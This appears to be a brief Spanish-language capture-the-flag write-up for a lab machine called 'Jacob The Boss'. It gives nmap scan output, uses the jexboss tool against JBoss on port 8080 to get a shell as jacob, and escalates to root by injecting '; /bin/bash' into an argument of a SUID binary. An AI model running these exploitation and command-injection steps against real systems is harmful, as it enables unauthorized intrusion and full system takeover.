# Jacob The Boss
## Initial Scan
```
22/tcp    open  ssh          OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 82:ca:13:6e:d9:63:c0:5f:4a:23:a5:a5:a5:10:3c:7f (RSA)
|   256 a4:6e:d2:5d:0d:36:2e:73:2f:1d:52:9c:e5:8a:7b:04 (ECDSA)
|_  256 6f:54:a6:5e:ba:5b:ad:cc:87:ee:d3:a8:d5:e0:aa:2a (ED25519)
80/tcp    open  http         Apache httpd 2.4.6 ((CentOS) PHP/7.3.20)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/7.3.20
|_http-title: My first blog
1098/tcp  open  java-rmi     Java RMI
1099/tcp  open  java-object  Java Object Serialization
| fingerprint-strings: 
|   NULL: 
|     java.rmi.MarshalledObject|
|     hash[
|     locBytest
|     objBytesq
|     http://jacobtheboss.box:8083/q
|     org.jnp.server.NamingServer_Stub
|     java.rmi.server.RemoteStub
|     java.rmi.server.RemoteObject
|     xpw;
|     UnicastRef2
|_    jacobtheboss.box
3306/tcp  open  mysql        MariaDB (unauthorized)
3873/tcp  open  java-object  Java Object Serialization
4444/tcp  open  java-rmi     Java RMI
4445/tcp  open  java-object  Java Object Serialization
4446/tcp  open  java-object  Java Object Serialization
4457/tcp  open  tandem-print Sharp printer tandem printing
4712/tcp  open  msdtc        Microsoft Distributed Transaction Coordinator (error)
4713/tcp  open  pulseaudio?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
|_    a4c1
8009/tcp  open  ajp13        Apache Jserv (Protocol v1.3)
| ajp-methods: 
|   Supported methods: GET HEAD POST PUT DELETE TRACE OPTIONS
|   Potentially risky methods: PUT DELETE TRACE
|_  See https://nmap.org/nsedoc/scripts/ajp-methods.html
8080/tcp  open  http         Apache Tomcat/Coyote JSP engine 1.1
| http-methods: 
|_  Potentially risky methods: PUT DELETE TRACE
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache-Coyote/1.1
|_http-title: Welcome to JBoss&trade;
8083/tcp  open  http         JBoss service httpd
|_http-title: Site doesn't have a title (text/html).
39277/tcp open  java-rmi     Java RMI
42177/tcp open  unknown
58584/tcp open  unknown
```
## Enum
En el puerto 8080 esta corriendo un servicio llamado JBoss, viendo el nombre de la máquina parece ser el servicio a explotar, existe una herramienta llamada Jexboss que permite comprobar las prinipales vulnerabilidades de serilaization de JBoss

## Exploit 
Descargamos jexboss y ejecutamos lo siguiente
```
python jexboss.py -host http://jacobtheboss.box:8080/
```
Con esto y un listener en local obtenmos un RCE como jacob

## Privesc
Encontrasmos un binario poco común en la máquina con el SUID activo
```
/usr/bin/pingsys
```
En el mismo se usan setuid y sytem(lo cual comprobamos con strings, aunque lo idaeal seria traerlo a local y analizar el binario) , esta combinación puede ser muy peligrosa si conseguimos concatenar comandos 
```
/usr/bin/pingsys '127.0.0.1; /bin/bash'
```
Y obtenermos una shell con uid de root

